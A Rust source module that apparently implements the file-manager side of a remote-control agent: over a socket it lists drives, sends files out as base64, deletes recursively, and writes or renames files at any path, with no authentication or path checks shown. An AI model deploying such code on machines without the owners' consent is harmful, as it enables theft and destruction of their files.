// File browser: ls, download, delete, mkdir, upload, rename

use std::{
    fs,
    path::Path,
    time::{SystemTime, UNIX_EPOCH},
};
use base64::{engine::general_purpose::STANDARD, Engine};
use serde_json::{json, Value};

use crate::Sock;
use crate::send;

const MAX_DOWNLOAD_BYTES: u64 = 50 * 1024 * 1024; // 50 MB

// ── helpers ──────────────────────────────────────────────────────────────────

fn fb_send(sock: &Sock, prefix: &str, payload: Value) {
    send(sock, &format!("{}{}", prefix, payload));
}

fn fb_error(sock: &Sock, prefix: &str, msg: &str) {
    fb_send(sock, prefix, json!({ "error": msg }));
}

fn format_mtime(modified: SystemTime) -> String {
    let secs = modified
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    // Format as DD.MM.YYYY HH:MM using simple arithmetic (no chrono dep)
    let (y, mo, d, h, mi) = epoch_to_ymd_hm(secs);
    format!("{:02}.{:02}.{} {:02}:{:02}", d, mo, y, h, mi)
}

/// Minimal epoch → (year, month, day, hour, minute) converter (UTC).
fn epoch_to_ymd_hm(secs: u64) -> (u64, u64, u64, u64, u64) {
    let s_per_min  = 60u64;
    let s_per_hour = 3600u64;
    let s_per_day  = 86400u64;

    let minute = (secs % s_per_hour) / s_per_min;
    let hour   = (secs % s_per_day) / s_per_hour;

    let mut days = secs / s_per_day;
    // Epoch is 1970-01-01
    let mut year = 1970u64;
    loop {
        let days_in_year = if is_leap(year) { 366 } else { 365 };
        if days < days_in_year { break; }
        days -= days_in_year;
        year += 1;
    }
    let months = [31u64,
        if is_leap(year) { 29 } else { 28 },
        31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
    let mut month = 1u64;
    for m in &months {
        if days < *m { break; }
        days -= m;
        month += 1;
    }
    (year, month, days + 1, hour, minute)
}

fn is_leap(y: u64) -> bool {
    (y % 4 == 0 && y % 100 != 0) || y % 400 == 0
}

// ── commands ─────────────────────────────────────────────────────────────────

pub fn handle_ls(sock: &Sock, path: &str) {
    // Empty path → list drives
    if path.is_empty() {
        let drives: Vec<Value> = ('A'..='Z')
            .filter_map(|c| {
                let d = format!("{}:\\", c);
                if Path::new(&d).exists() {
                    Some(json!({ "name": d, "type": "drive", "size": 0, "mtime": "" }))
                } else {
                    None
                }
            })
            .collect();
        let result = json!({ "path": "", "sep": "\\", "items": drives });
        fb_send(sock, "[ls_result]", result);
        return;
    }

    let dir = Path::new(path);
    if !dir.is_dir() {
        fb_error(sock, "[ls_result]", &format!("Directory not found: {}", path));
        return;
    }

    let entries = match fs::read_dir(dir) {
        Ok(e) => e,
        Err(_) => {
            fb_error(sock, "[ls_result]", "Access denied");
            return;
        }
    };

    let mut items: Vec<Value> = Vec::new();
    for entry in entries.flatten() {
        let name = entry.file_name().to_string_lossy().to_string();
        let meta = entry.metadata();
        let (is_dir, size, mtime, ext) = match meta {
            Ok(m) => {
                let is_dir = m.is_dir();
                let size   = if is_dir { 0 } else { m.len() };
                let mtime  = m.modified().map(format_mtime).unwrap_or_default();
                let ext    = if is_dir {
                    String::new()
                } else {
                    Path::new(&name)
                        .extension()
                        .map(|e| format!(".{}", e.to_string_lossy().to_lowercase()))
                        .unwrap_or_default()
                };
                (is_dir, size, mtime, ext)
            }
            Err(_) => (false, 0, String::new(), String::new()),
        };

        items.push(json!({
            "name":  name,
            "type":  if is_dir { "dir" } else { "file" },
            "link":  false,
            "size":  size,
            "mtime": mtime,
            "ext":   ext,
        }));
    }

    let result = json!({ "path": path, "sep": "\\", "items": items });
    fb_send(sock, "[ls_result]", result);
}

pub fn handle_download(sock: &Sock, path: &str) {
    let p = Path::new(path);
    if !p.is_file() {
        fb_error(sock, "[download_result]", "File not found");
        return;
    }
    let size = match p.metadata() {
        Ok(m) => m.len(),
        Err(_) => {
            fb_error(sock, "[download_result]", "Cannot read metadata");
            return;
        }
    };
    if size > MAX_DOWNLOAD_BYTES {
        fb_error(sock, "[download_result]",
                 &format!("File too large ({} MB > 50 MB)", size / 1024 / 1024));
        return;
    }
    let data = match fs::read(p) {
        Ok(d) => d,
        Err(_) => {
            fb_error(sock, "[download_result]", "Access denied");
            return;
        }
    };
    let b64  = STANDARD.encode(&data);
    let name = p.file_name().unwrap_or_default().to_string_lossy().to_string();
    let result = json!({ "name": name, "data": b64, "size": size });
    fb_send(sock, "[download_result]", result);
}

pub fn handle_delete(sock: &Sock, path: &str) {
    let p = Path::new(path);
    if !p.exists() {
        fb_error(sock, "[delete_result]", "Not found");
        return;
    }
    let res = if p.is_dir() {
        fs::remove_dir_all(p)
    } else {
        fs::remove_file(p)
    };
    match res {
        Ok(_) => fb_send(sock, "[delete_result]", json!({ "ok": true, "path": path })),
        Err(e) => fb_error(sock, "[delete_result]", &e.to_string()),
    }
}

pub fn handle_mkdir(sock: &Sock, path: &str) {
    match fs::create_dir_all(path) {
        Ok(_) => fb_send(sock, "[mkdir_result]", json!({ "ok": true, "path": path })),
        Err(e) => fb_error(sock, "[mkdir_result]", &e.to_string()),
    }
}

pub fn handle_upload(sock: &Sock, payload: &str) {
    let sep = match payload.find('|') {
        Some(i) => i,
        None => {
            fb_error(sock, "[upload_result]", "Invalid payload");
            return;
        }
    };
    let path = &payload[..sep];
    let b64  = &payload[sep + 1..];
    let data = match STANDARD.decode(b64) {
        Ok(d) => d,
        Err(_) => {
            fb_error(sock, "[upload_result]", "Base64 decode error");
            return;
        }
    };
    // Create parent dirs if needed
    if let Some(parent) = Path::new(path).parent() {
        let _ = fs::create_dir_all(parent);
    }
    match fs::write(path, &data) {
        Ok(_) => fb_send(sock, "[upload_result]",
                         json!({ "ok": true, "path": path, "size": data.len() })),
        Err(e) => fb_error(sock, "[upload_result]", &e.to_string()),
    }
}

pub fn handle_rename(sock: &Sock, payload: &str) {
    let sep = match payload.find('|') {
        Some(i) => i,
        None => {
            fb_error(sock, "[rename_result]", "Invalid payload");
            return;
        }
    };
    let old_path = &payload[..sep];
    let new_path = &payload[sep + 1..];
    if !Path::new(old_path).exists() {
        fb_error(sock, "[rename_result]", "Source not found");
        return;
    }
    match fs::rename(old_path, new_path) {
        Ok(_) => fb_send(sock, "[rename_result]",
                         json!({ "ok": true, "old": old_path, "new": new_path })),
        Err(e) => fb_error(sock, "[rename_result]", &e.to_string()),
    }
}
